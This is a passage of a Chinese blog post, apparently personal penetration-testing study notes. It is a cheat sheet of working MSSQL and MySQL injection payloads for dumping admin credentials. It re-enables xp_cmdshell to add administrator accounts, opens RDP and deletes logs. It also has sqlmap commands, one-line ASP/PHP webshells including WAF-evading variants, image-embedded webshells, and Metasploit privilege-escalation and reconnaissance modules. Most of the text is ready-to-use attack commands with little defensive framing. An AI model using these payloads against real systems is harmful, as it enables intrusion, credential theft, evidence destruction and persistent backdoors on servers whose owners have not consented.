+<p>可测试 serveradmin/setupadmin/securityadmin/diskadmin/bulkadmin</p>
+<p>and 1=(select IS_MEMBER(‘db_owner’));–</p>
+</li>
+<li><p>查询数据库版本</p>
+<p>id = 1 and 1= (select @@version) 测试当前数据库版本，然后可以搜索低版本漏洞</p>
+<p>原理：id=1是查询integer类型的数据，但是数据库版本信息是char类型数据，会强制转换，失败的话就会报错，在错误信息中暴露版本信息，其他同理，可以直接在id处查询：id=db_name()</p>
+</li>
+<li><p>db_name() 查询数据库名称</p>
+</li>
+<li><p>查询用户创建的第一个数据库</p>
+<p>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)</p>
+<p>第二个</p>
+<p>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘xxx’)</p>
+<p>或</p>
+<p>and 1=(select top 1 name from master..sysdatabases where dbid&gt;5)</p>
+</li>
+<li><p>查询所有数据库</p>
+<p>and 1=(slect name from master..sysdatabases for xml path)</p>
+</li>
+<li><p>列表名</p>
+<p>and 1=(select top 1 name from sysobjects where xtype=’u’)</p>
+<p>第二个</p>
+<p>and 1=(select top 1 name from sysobjects where xtype=’u’ and name &lt;&gt; ‘admin’) 这条语句一般不拦</p>
+</li>
+<li><p>列所有表</p>
+<p>and 1=(select name from sysobjects for xml path)</p>
+</li>
+<li><p>获取列名</p>
+<p>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name =’users’))</p>
+<p>第二列</p>
+<p>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name =’users’) and name &lt;&gt; ‘name’)</p>
+</li>
+<li><p>获取数据</p>
+<p>and 1=(select top 1 <strong>admin</strong> from <strong>admin</strong>)</p>
+<p>and 1=(select top 1 <strong>pass</strong> from <strong>admin</strong>)</p>
+</li>
+</ol>
+<p>如果有拦截，可以改变大小写来绕过</p>
+<h4 id="利用-MSSQL-扩展存储注入攻击"><a href="#利用-MSSQL-扩展存储注入攻击" class="headerlink" title="利用 MSSQL 扩展存储注入攻击"></a>利用 MSSQL 扩展存储注入攻击</h4><p>如果是sa权限，能做的事很多，比如执行命令。假如注入成功，但是破解不了后台管理员密码，就可以用命令修改密码。</p>
+<p>这里就要用到扩展插件</p>
+<ol>
+<li><p><strong>检测与恢复扩展插件</strong></p>
+<p><strong>判断 xp_cmdshell 是否存在：</strong></p>
+<p>and 1=(select count(*) from master.dbo.sysobjects where xtype=’x’AND name=’xp_cmdshell’)</p>
+<p><strong>判断 xp_regread 是否存在：</strong></p>
+<p>and 1=(select count(*) from master.dbo.sysobjects where name=’xp_regread’)</p>
+<p><strong>恢复插件：</strong></p>
+<p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE; <strong>恢复cmdshell</strong></p>
+<p>exec sp_dropextendedproc xp_cmdshell,’xplog70.dll’</p>
+<p><strong>关闭插件：</strong></p>
+<p>exec sp_configure ‘show advanced options’, 1;reconfigure;<br>exec sp_configure ‘xp_cmdshell’, 0;reconfigure;</p>
+</li>
+<li><p><strong>执行命令：</strong></p>
+<p>新建用户并移到管理员组：</p>
+<p>;exec master..xp_cmdshell ‘net user test test /add’</p>
+<p>;exec master..xp_cmdshell ‘net localgroup administrators test /add’</p>
+<p>然后就可以远程连接，如果端口未开放可以尝试打开端口</p>
+<p><strong>开启3389</strong></p>
+<p>;exec master..xp_cmdshell ‘sc config termservice start=auto’</p>
+<p>;exec master..xp_cmdshell ‘net start termservice’</p>
+<p>;exec master..xp_cmdshell ‘reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /vfDenyTSConnections /t REG_DWORD /d 0x0 /f’</p>
+</li>
+<li><p><strong>添加或删除一个sa权限的用户test</strong></p>
+<p>;exec master.dbo.sp_addlogin test,password</p>
+<p>;exec master.dbo.sp_addsrvrolemember test,sysadmin</p>
+</li>
+<li><p><strong>启动或停止服务，比如安全狗</strong></p>
+<p>;exec master..xp_servicecontrol ‘stop’,’schedule’</p>
+<p>;exec master..xp_servicecontrol ‘start’,’schedule’</p>
+</li>
+<li><p><strong>删除日志记录</strong></p>
+<p>;exec master.dbo.xp_cmdshell ‘del c:\winnt\system32\logfiles\xxx\xxx.log’</p>
+</li>
+<li><p><strong>开启远程数据库</strong></p>
+<p>;select * from openrowset(‘sqloledb’,’server=servername;uid=sa;pws=abc’,’select * from table 1’)</p>
+</li>
+<li><p><strong>把3389转发到80端口</strong></p>
+<p>因为路由器的3389不可能做转发，所以把目标服务器的3389转发到路由器的80上，来进行连接：</p>
+<p>;exec master..xpcmdshell ‘reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 0x50 /f’</p>
+</li>
+</ol>
+<h4 id="利用-sp-makewebtask-写一句话木马"><a href="#利用-sp-makewebtask-写一句话木马" class="headerlink" title="利用 sp_makewebtask 写一句话木马"></a>利用 sp_makewebtask 写一句话木马</h4><p>;exec sp_makewebtask ‘c:\inetpub\wwwroot\xxx\a.asp’,’select ‘’&lt;%execute (request(“cmd”))%&gt;’’’</p>
+<p>如果写不进去，先执行：</p>
+<p>;exec sp_configure ‘Web Assistant Procedures’, 1;RECONFIGURE</p>
+<h4 id="如果是-dbowner-权限写一句话"><a href="#如果是-dbowner-权限写一句话" class="headerlink" title="如果是 dbowner 权限写一句话"></a>如果是 dbowner 权限写一句话</h4><p>;alter database ssdown5 set recovery full    把网站改成recovery模式</p>
+<p>;create table test(str image)–    创建一个表</p>
+<p>;backup log ssdown5 to disk=’c:\test’ with init–    备份一下</p>
+<p>;insert into test(str) values (‘&lt;%execute (request(“cmd”))%&gt;’)–    插入一句话</p>
+<p>;backup log ssdown5 to disk=’c:\inetpub\wwwroot\x.asp’–    备份到网站根目录</p>
+<p>;alter database ssdown5 set recovery simple    转换模式</p>
+<p>工具：getwebshell 增强版 需要网站根目录/穿山甲/sqlmap/萝卜头</p>
+<p>一般可以列出其他库名的时候说明可以跨库查询</p>
+<h4 id="sqlmap-（有时候-sqlmap-不能执行命令但是穿山甲可以）"><a href="#sqlmap-（有时候-sqlmap-不能执行命令但是穿山甲可以）" class="headerlink" title="sqlmap （有时候 sqlmap 不能执行命令但是穿山甲可以）"></a>sqlmap （有时候 sqlmap 不能执行命令但是穿山甲可以）</h4><ul>
+<li>sqlmap -u “注入点”</li>
+<li>sqlmap -u “注入点” –is-dba 看是否是 dba 权限</li>
+<li>sqlmap -u “注入点” –current-user 看看当前用户名称</li>
+<li>sqlmap -u “注入点” –privileges 查看用户</li>
+<li>sqlmap -u “注入点” –password 尝试爆破密码</li>
+<li>sqlmap -u “注入点” –os-shell 打开xp_cmdshell</li>
+<li>sqlmap -u “注入点” –dbs 管理员可以直接列数据库</li>
+<li>sqlmap -u “注入点” –current-db 查询当前数据库</li>
+<li>sqlmap -u “注入点” –tables -D test –count</li>
+<li>sqlmap -u “注入点” –columns -T admin -D test</li>
+<li>sqlmap -u “注入点” –dump -C a -T admin -D test</li>
+<li>sqlmap -u “注入点” echo ^&lt;%eval request(“muma”);%^&gt; &gt;  c:\wwwroot\a.asp 写一句话</li>
+</ul>
+<p>如果对方有防过滤的代码，可以用特殊字符绕过，比如：</p>
+<p>用 /**/ 或 + 或 %0a 代替空格，或者尝试用大小写</p>
+<h2 id="Mysql-注入"><a href="#Mysql-注入" class="headerlink" title="Mysql 注入"></a>Mysql 注入</h2><h3 id="可能用到的查询函数"><a href="#可能用到的查询函数" class="headerlink" title="可能用到的查询函数"></a>可能用到的查询函数</h3><ul>
+<li>system_user() 系统用户名</li>
+<li>user() 用户名</li>
+<li>current_user() 当前用户名</li>
+<li>session_user() 连接数据库的用户名</li>
+<li>database() 数据库名</li>
+<li>version() 数据库版本</li>
+<li>load_file(‘c:/123.txt’) 转成16进制或者10进制，mysql 读取本地文件的函数</li>
+<li>@@datadir 读取数据库路径</li>
+<li>@@basedir mysql安装路径，可以根据这个来推测网站的根目录</li>
+<li>@@version_compile_os 操作系统</li>
+<li></li>
+</ul>
+<h2 id="脚本木马"><a href="#脚本木马" class="headerlink" title="脚本木马"></a>脚本木马</h2><ul>
+<li>一句话木马</li>
+<li>小马</li>
+<li>大马</li>
+<li>打包马</li>
+<li>拖库马</li>
+<li>等等</li>
+</ul>
+<h3 id="一句话木马："><a href="#一句话木马：" class="headerlink" title="一句话木马："></a>一句话木马：</h3><p>&lt;%execute request(“value”)%&gt;</p>
+<p>把客户端提交的数据当作命令来执行。request 是定义传输方式的。</p>
+<p>cracer.com/x.asp?value=whoami</p>
+<p>waf 一般拦截的是请求执行命令的函数。</p>
+<ul>
+<li><p>asp</p>
+<p>&lt;%eval requset(c)%&gt;</p>
+</li>
+<li><p>php</p>
+<?php @eval($_POST['sb']);?>
+
+</li>
+</ul>
+<p><strong>变形，绕 waf</strong></p>
+<ul>
+<li><p>php</p>
+<?php $_REQUEST['a']($_REQUEST['b']);?>
+
+<p>动态传参，菜刀连接时 URL 可改为：127.0.0.1/a.php?a=eval&amp;b=phpinfo;，把 eval 传给 a，但现在没有办法绕过了。</p>
+</li>
+<li><p>&lt;%Eval(Request(chr(112)))%&gt;</p>
+<p>value 改为 ASCII 码，这样就不需要写单引号或双引号了。</p>
+</li>
+<li><p>&lt;%Eval(Request(chr(112)+chr(114)+chr(117)))%&gt;</p>
+<p>多个字母。</p>
+</li>
+</ul>
+<p><strong>一句话图片马的制作</strong></p>
+<ul>
+<li>c32 用十六进制打开（hex）</li>
+<li>图片拖进去</li>
+<li>在最后把一句话复制进去</li>
+<li>保存，然后上传到 web 中</li>
+<li>想办法解析成脚本文件格式</li>
+<li>菜刀连接，或者利用文件包含</li>
+</ul>
+<p><strong>Windows 修改目录权限</strong></p>
+<p>用 cacls 命令修改文件夹权限等</p>
+<p>上传 cmd.exe，利用 setp 命令来进行调用，但必须要有权限。</p>
+<p><strong>黑吃黑</strong></p>
+<p>webshell 后门，F12 看网络模块，会将请求传递到某个地址，每请求一次就会发送一次。这里将发送的一部分改为 xss payload 盗取 cookie（利用 xss 平台等），然后用工具，比如马哥，来黑吃黑。</p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><ul>
+<li>权限提升：提权几种方式</li>
+<li>信息收集：服务器信息、Hash、防火墙杀毒软件、账号密码</li>
+<li>内网渗透：端口转发、代理跳板</li>
+<li>后门植入：永久后门维持权限</li>
+</ul>
+<ol>
+<li><p>权限提升</p>
+<ul>
+<li><p>提高程序运行级别</p>
+<p>msf 模块</p>
+<p>exploit/windows/local/ask</p>
+</li>
+<li><p>UAC 绕过</p>
+<p>· exploit/windows/local/bypassuac</p>
+<p>· exploit/windows/local/bypassuac_injection</p>
+<p>· exploit/windows/local/bypassuac_vbs</p>
+</li>
+<li><p>利用提权漏洞来提权</p>
+<p>· exploit/windows/local/ms14_058_track_popup_menu</p>
+<p>test on Windows XP</p>
+<p>· exploit/windows/local/ms16_016_webdav</p>
+<p>win 7 内核提权漏洞</p>
+</li>
+</ul>
+</li>
+<li><p>信息收集</p>
+<p>meterpreter&gt; 此 session 是高权限</p>
+<ul>
+<li><p>获取目标机器的分区情况</p>
+<p>run post/windows/gather/forensics/enum_drives</p>
+</li>
+<li><p>判断是否是虚拟机</p>
+<p>run post/windows/gather/checkvm</p>
+</li>
+<li><p>获取运行的服务（包括权限、路径等）</p>
+<p>run post/windows/gather/enum_services</p>
+</li>
+<li><p>安装了哪些应用</p>
+<p>run post/windows/gather/enum_applications</p>
+</li>
+<li><p>应用了哪些共享</p>
+<p>run post/windows/gather/enum_shares</p>
+</li>
+<li><p>列出主机最近的一些操作</p>
+<p>run post/windows/gather/dumplinks</p>
+</li>
+<li><p>查看主机是否安装补丁，对应漏洞编号等</p>
+<p>run post/windows/gather/enum_patches</p>
+</li>
+<li><p>利用脚本获取详细信息</p>
+<p>· run scraper</p>
+<p>然后进入 ~/.msf4/logs/scripts/scraper 中有保存文件，如果显示乱码就先更改一下编码方式。</p>
+<p>· run winenum</p>
+<p>保存位置：~/.msf4/logs/scripts/winenum</p>
+</li>
+</ul>
+</li>
+<li><p>数据包捕获</p>
+<p><strong>抓包与解包：</strong>获取网络中数据的交互</p>
+<p>抓包</p>
+<ul>
+<li>加载 sniffer: load sniffer</li>
+<li>查看网卡信息：sniffer_interface</li>
+<li>开启监听：sniffer_start 1</li>
+<li>导出数据包：sniffer_dump 1 1.cap</li>
+</ul>
+<p>解包</p>
+<ul>
+<li>auxiliary/sniffer/psnu</li>
+</ul>
+</li>
+</ol>
+</div><div class="article-meta" style="max-width:800px"><div class="tags"><i class="icon icon-tag"></i><ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/综合/">综合</a><span class="tag-list-count">1</span></li></ul></div></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck658bscx000pxioz5uomuf8b" data-title="study [实时更新]" data-url="http://yoursite.com/2018/04/05/study/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/03/02/use-hexo/"><i class="icon icon-arror-left"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
